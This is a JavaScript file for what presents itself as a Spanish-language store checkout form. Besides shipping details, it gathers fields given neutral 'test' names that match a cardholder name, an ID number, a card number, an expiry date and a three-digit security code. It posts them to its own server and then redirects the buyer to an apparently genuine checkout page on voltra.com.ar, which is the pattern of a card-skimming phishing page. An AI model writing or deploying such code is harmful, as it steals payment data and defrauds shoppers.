const form = document.getElementById("checkoutForm");
const button = document.getElementById("submitButton");
const status = document.getElementById("status");

const DESTINO =
    "https://voltra.com.ar/checkouts/cn/hWNHaxxHIjGpE0gTudP9ILbO/es-ar?_r=AQABW4563Sxx10vQkK28hIWf4dUmnLWZiO1IcXlgdrHT56hktGU4";

form.addEventListener("submit", async function (event) {
    event.preventDefault();

    button.disabled = true;
    button.textContent = "Enviando...";
    status.textContent = "";

    const data = {
        name: document.getElementById("name").value,
        email: document.getElementById("email").value,
        address: document.getElementById("address").value,
        postalCode: document.getElementById("postalCode").value,
        city: document.getElementById("city").value,
        province: document.getElementById("province").value,
        message: document.getElementById("message").value,

        testFullName: document.getElementById("testFullName").value,
        testCode8: document.getElementById("testCode8").value,
        testCode20: document.getElementById("testCode20").value,
        testDate: document.getElementById("testDate").value,
        testCode3: document.getElementById("testCode3").value
    };

    try {
        const response = await fetch("/api/test", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (!response.ok || !result.ok) {
            throw new Error(
                result.error || "No se pudo completar la simulación."
            );
        }

        status.style.color = "#16834b";
        status.textContent = "✓ Enviado. Continuando...";

        setTimeout(() => {
            window.location.href = DESTINO;
        }, 500);

    } catch (error) {
        status.style.color = "#d93025";
        status.textContent = "Error: " + error.message;
        button.disabled = false;
        button.textContent = "FINALIZAR EL PAGO →";
    }
});
